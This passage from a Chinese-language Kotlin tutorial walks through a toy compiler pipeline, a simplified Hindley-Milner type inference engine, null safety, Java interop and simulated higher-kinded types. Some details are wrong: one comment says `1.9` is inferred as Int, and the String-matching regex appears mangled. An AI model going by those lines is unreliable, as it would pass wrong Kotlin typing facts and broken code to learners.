<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 理解 Kotlin 编译过程：源代码 → AST → IR → 目标代码</span>

<span class="hljs-comment">// 模拟编译器处理过程的概念性代码</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CompilerPhase</span> {
    
    <span class="hljs-comment">// 1. 词法分析</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">lexicalAnalysis</span><span class="hljs-params">(source: <span class="hljs-type">String</span>)</span></span>: List&lt;Token&gt; {
        <span class="hljs-keyword">return</span> source.split(<span class="hljs-string">"\s+"</span>.toRegex())
            .filter { it.isNotBlank() }
            .map { Token(it) }
    }
    
    <span class="hljs-comment">// 2. 语法分析（生成 AST）</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">parse</span><span class="hljs-params">(tokens: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Token</span>&gt;)</span></span>: ASTNode {
        <span class="hljs-comment">// 简化的解析逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> {
            tokens.size == <span class="hljs-number">1</span> -&gt; ASTNode.Leaf(tokens.first())
            <span class="hljs-keyword">else</span> -&gt; ASTNode.Branch(tokens.first(), tokens.drop(<span class="hljs-number">1</span>).map { ASTNode.Leaf(it) })
        }
    }
    
    <span class="hljs-comment">// 3. 语义分析（类型检查等）</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">semanticAnalysis</span><span class="hljs-params">(ast: <span class="hljs-type">ASTNode</span>)</span></span>: TypedASTNode {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (ast) {
            <span class="hljs-keyword">is</span> ASTNode.Leaf -&gt; TypedASTNode.TypedLeaf(ast.token, inferType(ast.token))
            <span class="hljs-keyword">is</span> ASTNode.Branch -&gt; TypedASTNode.TypedBranch(ast, ast.children.map { semanticAnalysis(it) })
        }
    }
    
    <span class="hljs-comment">// 4. 生成 IR</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateIR</span><span class="hljs-params">(typedAst: <span class="hljs-type">TypedASTNode</span>)</span></span>: IRNode {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (typedAst) {
            <span class="hljs-keyword">is</span> TypedASTNode.TypedLeaf -&gt; IRNode.Constant(typedAst.token.value, typedAst.type)
            <span class="hljs-keyword">is</span> TypedASTNode.TypedBranch -&gt; IRNode.FunctionCall(typedAst.node.token.value, 
                typedAst.children.map { generateIR(it) })
        }
    }
    
    <span class="hljs-comment">// 5. 目标代码生成</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">generateTargetCode</span><span class="hljs-params">(ir: <span class="hljs-type">IRNode</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (ir) {
            <span class="hljs-keyword">is</span> IRNode.Constant -&gt; <span class="hljs-string">"push <span class="hljs-subst">${ir.value}</span>"</span>
            <span class="hljs-keyword">is</span> IRNode.FunctionCall -&gt; 
                ir.arguments.joinToString(<span class="hljs-string">"\n"</span>) { generateTargetCode(it) } + <span class="hljs-string">"\ncall <span class="hljs-subst">${ir.functionName}</span>"</span>
        }
    }
}

<span class="hljs-comment">// 编译器数据结构</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Token</span>(<span class="hljs-keyword">val</span> value: String)

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ASTNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Leaf</span>(<span class="hljs-keyword">val</span> token: Token) : ASTNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Branch</span>(<span class="hljs-keyword">val</span> token: Token, <span class="hljs-keyword">val</span> children: List&lt;ASTNode&gt;) : ASTNode()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedASTNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedLeaf</span>(<span class="hljs-keyword">val</span> token: Token, <span class="hljs-keyword">val</span> type: Type) : TypedASTNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypedBranch</span>(<span class="hljs-keyword">val</span> node: ASTNode.Branch, <span class="hljs-keyword">val</span> children: List&lt;TypedASTNode&gt;) : TypedASTNode()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IRNode</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Constant</span>(<span class="hljs-keyword">val</span> value: String, <span class="hljs-keyword">val</span> type: Type) : IRNode()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionCall</span>(<span class="hljs-keyword">val</span> functionName: String, <span class="hljs-keyword">val</span> arguments: List&lt;IRNode&gt;) : IRNode()
}

<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span>(<span class="hljs-keyword">val</span> name: String)

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">inferType</span><span class="hljs-params">(token: <span class="hljs-type">Token</span>)</span></span>: Type = <span class="hljs-keyword">when</span> {
    token.value.matches(Regex(<span class="hljs-string">"\d+"</span>)) -&gt; Type(<span class="hljs-string">"Int"</span>)
    token.value.matches(Regex(<span class="hljs-string">""</span>.*<span class="hljs-string">""</span>)) -&gt; Type(<span class="hljs-string">"String"</span>)
    <span class="hljs-keyword">else</span> -&gt; Type(<span class="hljs-string">"Unknown"</span>)
}

<span class="hljs-comment">// 测试编译器流程</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testCompilerPhases</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> source = <span class="hljs-string">"add 1 2"</span>
    <span class="hljs-keyword">val</span> compiler = CompilerPhase()
    
    <span class="hljs-keyword">val</span> tokens = compiler.lexicalAnalysis(source)
    println(<span class="hljs-string">"词法分析: <span class="hljs-variable">$tokens</span>"</span>)
    
    <span class="hljs-keyword">val</span> ast = compiler.parse(tokens)
    println(<span class="hljs-string">"语法分析: <span class="hljs-variable">$ast</span>"</span>)
    
    <span class="hljs-keyword">val</span> typedAst = compiler.semanticAnalysis(ast)
    println(<span class="hljs-string">"语义分析: <span class="hljs-variable">$typedAst</span>"</span>)
    
    <span class="hljs-keyword">val</span> ir = compiler.generateIR(typedAst)
    println(<span class="hljs-string">"中间表示: <span class="hljs-variable">$ir</span>"</span>)
    
    <span class="hljs-keyword">val</span> targetCode = compiler.generateTargetCode(ir)
    println(<span class="hljs-string">"目标代码:\n<span class="hljs-variable">$targetCode</span>"</span>)
}
</code></pre>
<h5 data-id="heading-3"><strong>2. 类型推断算法原理</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 简化的 Hindley-Milner 类型推断算法概念实现</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeInferenceEngine</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> typeVariables = mutableMapOf&lt;String, Type&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> constraints = mutableListOf&lt;Constraint&gt;()
    
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeScheme</span>(<span class="hljs-keyword">val</span> variables: List&lt;String&gt;, <span class="hljs-keyword">val</span> type: Type)
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Constraint</span>(<span class="hljs-keyword">val</span> left: Type, <span class="hljs-keyword">val</span> right: Type)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">infer</span><span class="hljs-params">(expression: <span class="hljs-type">Expression</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">val</span> freshType = freshTypeVariable()
        <span class="hljs-keyword">val</span> context = emptyMap&lt;String, TypeScheme&gt;()
        <span class="hljs-keyword">return</span> inferExpression(expression, context, freshType)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">inferExpression</span><span class="hljs-params">(expr: <span class="hljs-type">Expression</span>, context: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, TypeScheme&gt;, 
                              resultType: <span class="hljs-type">Type</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (expr) {
            <span class="hljs-keyword">is</span> Expression.Variable -&gt; {
                <span class="hljs-keyword">val</span> scheme = context[expr.name] ?: <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"未定义的变量: <span class="hljs-subst">${expr.name}</span>"</span>)
                instantiate(scheme)
            }
            <span class="hljs-keyword">is</span> Expression.Lambda -&gt; {
                <span class="hljs-keyword">val</span> paramType = freshTypeVariable()
                <span class="hljs-keyword">val</span> newContext = context + (expr.param to TypeScheme(emptyList(), paramType))
                <span class="hljs-keyword">val</span> bodyType = inferExpression(expr.body, newContext, resultType)
                TypeScheme(emptyList(), Type.Function(paramType, bodyType.type))
            }
            <span class="hljs-keyword">is</span> Expression.Application -&gt; {
                <span class="hljs-keyword">val</span> functionType = inferExpression(expr.function, context, freshTypeVariable())
                <span class="hljs-keyword">val</span> argType = inferExpression(expr.argument, context, freshTypeVariable())
                constraints.add(Constraint(functionType.type, Type.Function(argType.type, resultType)))
                TypeScheme(emptyList(), resultType)
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unify</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">while</span> (constraints.isNotEmpty()) {
            <span class="hljs-keyword">val</span> constraint = constraints.removeFirst()
            unifyTypes(constraint.left, constraint.right)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">unifyTypes</span><span class="hljs-params">(t1: <span class="hljs-type">Type</span>, t2: <span class="hljs-type">Type</span>)</span></span> {
        <span class="hljs-keyword">when</span> {
            t1 == t2 -&gt; <span class="hljs-keyword">return</span>
            t1 <span class="hljs-keyword">is</span> Type.Variable -&gt; bindVariable(t1.name, t2)
            t2 <span class="hljs-keyword">is</span> Type.Variable -&gt; bindVariable(t2.name, t1)
            t1 <span class="hljs-keyword">is</span> Type.Function &amp;&amp; t2 <span class="hljs-keyword">is</span> Type.Function -&gt; {
                constraints.add(Constraint(t1.from, t2.from))
                constraints.add(Constraint(t1.to, t2.to))
            }
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"类型不匹配: <span class="hljs-variable">$t1</span> 和 <span class="hljs-variable">$t2</span>"</span>)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">bindVariable</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">Type</span>)</span></span> {
        <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">is</span> Type.Variable &amp;&amp; type.name == name) <span class="hljs-keyword">return</span>
        <span class="hljs-keyword">if</span> (occursCheck(name, type)) <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">"无限类型"</span>)
        typeVariables[name] = type
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">occursCheck</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, type: <span class="hljs-type">Type</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (type) {
            <span class="hljs-keyword">is</span> Type.Variable -&gt; type.name == name
            <span class="hljs-keyword">is</span> Type.Function -&gt; occursCheck(name, type.from) || occursCheck(name, type.to)
            <span class="hljs-keyword">else</span> -&gt; <span class="hljs-literal">false</span>
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">freshTypeVariable</span><span class="hljs-params">()</span></span>: Type.Variable {
        <span class="hljs-keyword">return</span> Type.Variable(<span class="hljs-string">"T<span class="hljs-subst">${typeVariables.size}</span>"</span>)
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">instantiate</span><span class="hljs-params">(scheme: <span class="hljs-type">TypeScheme</span>)</span></span>: TypeScheme {
        <span class="hljs-keyword">val</span> substitutions = scheme.variables.associateWith { freshTypeVariable() }
        <span class="hljs-keyword">return</span> TypeScheme(emptyList(), substitute(scheme.type, substitutions))
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">substitute</span><span class="hljs-params">(type: <span class="hljs-type">Type</span>, substitutions: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, Type&gt;)</span></span>: Type {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">when</span> (type) {
            <span class="hljs-keyword">is</span> Type.Variable -&gt; substitutions[type.name] ?: type
            <span class="hljs-keyword">is</span> Type.Function -&gt; Type.Function(
                substitute(type.from, substitutions),
                substitute(type.to, substitutions)
            )
            <span class="hljs-keyword">else</span> -&gt; type
        }
    }
}

<span class="hljs-comment">// 表达式和类型定义</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Expression</span> {
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Variable</span>(<span class="hljs-keyword">val</span> name: String) : Expression()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Lambda</span>(<span class="hljs-keyword">val</span> param: String, <span class="hljs-keyword">val</span> body: Expression) : Expression()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span>(<span class="hljs-keyword">val</span> function: Expression, <span class="hljs-keyword">val</span> argument: Expression) : Expression()
}

<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Type</span> {
    <span class="hljs-keyword">object</span> <span class="hljs-built_in">Int</span> : Type()
    <span class="hljs-keyword">object</span> Bool : Type()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Variable</span>(<span class="hljs-keyword">val</span> name: String) : Type()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Function</span>(<span class="hljs-keyword">val</span> from: Type, <span class="hljs-keyword">val</span> to: Type) : Type()
}
</code></pre>
<h4 data-id="heading-4"><strong>四十七、Kotlin 语言设计哲学</strong></h4>
<h5 data-id="heading-5"><strong>1. 实用主义设计原则</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 空安全：编译时防止运行时错误</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">NullSafetyPrinciples</span> {
    
    <span class="hljs-comment">// 安全调用操作符的设计哲学</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateSafeCall</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> nullableString: String? = getPossiblyNullString()
        
        <span class="hljs-comment">// 传统方式（容易忘记检查）</span>
        <span class="hljs-comment">// val length = nullableString.length // 编译错误！</span>
        
        <span class="hljs-comment">// Kotlin 方式（强制处理空值）</span>
        <span class="hljs-keyword">val</span> safeLength = nullableString?.length ?: <span class="hljs-number">0</span>
        println(<span class="hljs-string">"安全长度: <span class="hljs-variable">$safeLength</span>"</span>)
    }
    
    <span class="hljs-comment">// 类型系统的实用主义</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateTypeSystem</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 类型推断：减少样板代码</span>
        <span class="hljs-keyword">val</span> name = <span class="hljs-string">"Kotlin"</span> <span class="hljs-comment">// 编译器推断为 String</span>
        <span class="hljs-keyword">val</span> version = <span class="hljs-number">1.9</span>   <span class="hljs-comment">// 编译器推断为 Int</span>
        
        <span class="hljs-comment">// 智能转换：减少显式类型转换</span>
        <span class="hljs-keyword">val</span> obj: Any = <span class="hljs-string">"Hello"</span>
        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">is</span> String) {
            println(obj.length) <span class="hljs-comment">// 自动转换为 String</span>
        }
    }
}

<span class="hljs-comment">// 2. 扩展函数的哲学：开放封闭原则</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">DesignPrinciples</span> {
    <span class="hljs-comment">// 对扩展开放：可以为现有类添加新功能</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">addEmphasis</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"**<span class="hljs-variable">$this</span>**"</span>
    
    <span class="hljs-comment">// 对修改封闭：不需要修改原始类</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateExtensionPhilosophy</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> text = <span class="hljs-string">"重要信息"</span>
        println(text.addEmphasis()) <span class="hljs-comment">// 输出：**重要信息**</span>
    }
}

<span class="hljs-comment">// 3. 函数式编程与面向对象的融合</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionalOOFusion</span> {
    
    <span class="hljs-comment">// 高阶函数：函数是一等公民</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">filterWithLogging</span><span class="hljs-params">(predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: List&lt;T&gt; {
        println(<span class="hljs-string">"开始过滤列表，大小: <span class="hljs-subst">${this.size}</span>"</span>)
        <span class="hljs-keyword">val</span> result = <span class="hljs-keyword">this</span>.filter(predicate)
        println(<span class="hljs-string">"过滤完成，结果大小: <span class="hljs-subst">${result.size}</span>"</span>)
        <span class="hljs-keyword">return</span> result
    }
    
    <span class="hljs-comment">// 数据类：不可变性的价值</span>
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span>(<span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> y: <span class="hljs-built_in">Int</span>) {
        <span class="hljs-comment">// 而不是提供 setter，提供转换方法</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">move</span><span class="hljs-params">(dx: <span class="hljs-type">Int</span>, dy: <span class="hljs-type">Int</span>)</span></span>: ImmutablePoint = copy(x = x + dx, y = y + dy)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateImmutability</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> point = ImmutablePoint(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
        <span class="hljs-keyword">val</span> moved = point.move(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)
        println(<span class="hljs-string">"原始点: <span class="hljs-variable">$point</span>, 移动后: <span class="hljs-variable">$moved</span>"</span>) <span class="hljs-comment">// 原始对象保持不变</span>
    }
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getPossiblyNullString</span><span class="hljs-params">()</span></span>: String? = <span class="hljs-keyword">if</span> (System.currentTimeMillis() % <span class="hljs-number">2</span> == <span class="hljs-number">0L</span>) <span class="hljs-string">"非空"</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
</code></pre>
<h5 data-id="heading-6"><strong>2. Kotlin 与 Java 的互操作设计</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 空值注解的互操作</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaInteropDesign</span> {
    
    <span class="hljs-comment">// Java 代码中的注解：</span>
    <span class="hljs-comment">// @Nullable String getNullableString();</span>
    <span class="hljs-comment">// @NotNull String getNotNullString();</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleJavaNullability</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// Kotlin 编译器理解这些注解</span>
        <span class="hljs-keyword">val</span> nullable: String? = JavaClass().nullableString <span class="hljs-comment">// 可空类型</span>
        <span class="hljs-keyword">val</span> notNull: String = JavaClass().notNullString    <span class="hljs-comment">// 非空类型</span>
        
        println(<span class="hljs-string">"可空: <span class="hljs-variable">$nullable</span>, 非空: <span class="hljs-variable">$notNull</span>"</span>)
    }
    
    <span class="hljs-comment">// 2. 集合类型的互操作</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleJavaCollections</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> javaList: java.util.ArrayList&lt;String&gt; = JavaClass().getStringList()
        
        <span class="hljs-comment">// Kotlin 提供扩展函数使 Java 集合更易用</span>
        <span class="hljs-keyword">val</span> kotlinList = javaList.filter { it.length &gt; <span class="hljs-number">3</span> }
                                  .map { it.uppercase() }
        
        println(<span class="hljs-string">"转换后的列表: <span class="hljs-variable">$kotlinList</span>"</span>)
    }
    
    <span class="hljs-comment">// 3. SAM（Single Abstract Method）转换</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleSamConversion</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> javaClass = JavaClass()
        
        <span class="hljs-comment">// Java 中的接口：interface Runnable { void run(); }</span>
        <span class="hljs-comment">// 在 Kotlin 中可以使用 lambda</span>
        javaClass.runWithCallback { 
            println(<span class="hljs-string">"SAM 转换：从 Kotlin 传递 lambda 到 Java"</span>)
        }
    }
    
    <span class="hljs-comment">// 4. 伴生对象与静态方法的互操作</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-meta">@JvmStatic</span>
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">staticMethodForJava</span><span class="hljs-params">()</span></span>: String = <span class="hljs-string">"Java 可以像调用静态方法一样调用我"</span>
        
        <span class="hljs-meta">@JvmField</span>
        <span class="hljs-keyword">val</span> staticFieldForJava: String = <span class="hljs-string">"Java 可以像访问静态字段一样访问我"</span>
    }
}

<span class="hljs-comment">// 模拟的 Java 类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaClass</span> {
    <span class="hljs-keyword">val</span> nullableString: String? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">val</span> notNullString: String = <span class="hljs-string">"非空字符串"</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getStringList</span><span class="hljs-params">()</span></span>: java.util.ArrayList&lt;String&gt; {
        <span class="hljs-keyword">return</span> arrayListOf(<span class="hljs-string">"one"</span>, <span class="hljs-string">"two"</span>, <span class="hljs-string">"three"</span>, <span class="hljs-string">"four"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runWithCallback</span><span class="hljs-params">(runnable: <span class="hljs-type">Runnable</span>)</span></span> {
        runnable.run()
    }
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span>
}
</code></pre>
<h4 data-id="heading-7"><strong>四十八、高级类型系统特性</strong></h4>
<h5 data-id="heading-8"><strong>1. 高阶类型与种类（Kind）系统</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 模拟高阶类型的概念</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HigherKindedType</span>&lt;<span class="hljs-type">F&lt;_</span>&gt;&gt; { <span class="hljs-comment">// 注意：这不是合法的 Kotlin 语法，是概念表示</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A&gt;</span> <span class="hljs-title">pure</span><span class="hljs-params">(a: <span class="hljs-type">A</span>)</span></span>: F&lt;A&gt;
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> <span class="hljs-title">map</span><span class="hljs-params">(fa: <span class="hljs-type">F</span>&lt;<span class="hljs-type">A</span>&gt;, f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: F&lt;B&gt;
}

<span class="hljs-comment">// 在 Kotlin 中通过辅助类型模拟</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Kind</span>&lt;<span class="hljs-type">F, A</span>&gt;

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HigherKindedSimulation</span> {
    
    <span class="hljs-comment">// 模拟 Functor 类型类</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Functor</span>&lt;<span class="hljs-type">F</span>&gt; {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;F, A&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: Kind&lt;F, B&gt;
    }
    
    <span class="hljs-comment">// 列表的 Functor 实例</span>
    <span class="hljs-keyword">object</span> ListFunctor : Functor&lt;ListK&gt; {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;ListK, A&gt;</span>.<span class="hljs-title">map</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: Kind&lt;ListK, B&gt; {
            <span class="hljs-keyword">val</span> list = (<span class="hljs-keyword">this</span> <span class="hljs-keyword">as</span> ListKWrapper&lt;A&gt;).list
            <span class="hljs-keyword">return</span> ListKWrapper(list.map(f))
        }
    }
    
    <span class="hljs-comment">// 包装类型</span>
    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListK</span>
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListKWrapper</span>&lt;<span class="hljs-type">A</span>&gt;(<span class="hljs-keyword">val</span> list: List&lt;A&gt;) : Kind&lt;ListK, A&gt;
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;A, B&gt;</span> Kind<span class="hljs-type">&lt;ListK, A&gt;</span>.<span class="hljs-title">simulatedMap</span><span class="hljs-params">(f: (<span class="hljs-type">A</span>) -&gt; <span class="hljs-type">B</span>)</span></span>: ListKWrapper&lt;B&gt; {
        <span class="hljs-keyword">return</span> ListFunctor.run { <span class="hljs-keyword">this</span><span class="hljs-symbol">@simulatedMap</span>.map(f) } <span class="hljs-keyword">as</span> ListKWrapper&lt;B&gt;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">demonstrateSimulatedHKT</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> wrappedList = ListKWrapper(listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>))
        <span class="hljs-keyword">val</span> mapped = wrappedList.simulatedMap { it * <span class="hljs-number">2</span> }
        println(<span class="hljs-string">"模拟高阶类型映射: <span class="hljs-subst">${mapped.list}</span>"</span>)
    }
}

<span class="hljs-comment">// 2. 类型投影和星投影的深入理解</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TypeProjectionAdvanced</span> {
    
    <span class="hljs-comment">// 使用处型变：声明处型变的补充</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">copyFromTo</span><span class="hljs-params">(from: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">Any</span>&gt;, to: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">in</span> <span class="hljs-type">Any</span>&gt;)</span></span> {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> from.indices) {
            to[i] = from[i] <span class="hljs-comment">// 安全，因为 from 是协变的</span>
        }
    }
    
    <span class="hljs-comment">// 星投影的精确含义</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processList</span><span class="hljs-params">(list: <span class="hljs-type">List</span>&lt;*&gt;)</span></span> {
        <span class="hljs-comment">// list 的元素类型是未知的，但我们可以进行不依赖具体类型的操作</span>
        println(<span class="hljs-string">"列表大小: <span class="hljs-subst">${list.size}</span>"</span>)
        println(<span class="hljs-string">"是否为空: <span class="hljs-subst">${list.isEmpty()}</span>"</span>)
        
        <span class="hljs-comment">// 但不能安全地访问元素内容</span>
        <span class="hljs-comment">// val first = list[0] // 类型是 Any?，可能不是我们期望的类型</span>
    }
    
    <span class="hljs-comment">// 有界类型参数的高级用法</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> <span class="hljs-title">ensureTrailingSlash</span><span class="hljs-params">(path: <span class="hljs-type">T</span>)</span></span>: T 
        <span class="hljs-keyword">where</span> T : CharSequence, 
              T : Appendable {
        <span class="hljs-keyword">if</span> (!path.endsWith(<span class="hljs-string">'/'</span>)) {
            path.append(<span class="hljs-string">'/'</span>)
        }
        <span class="hljs-keyword">return</span> path
    }
}
</code></pre>
<h5 data-id="heading-9"><strong>2. 路径依赖类型的概念模拟</strong></h5>
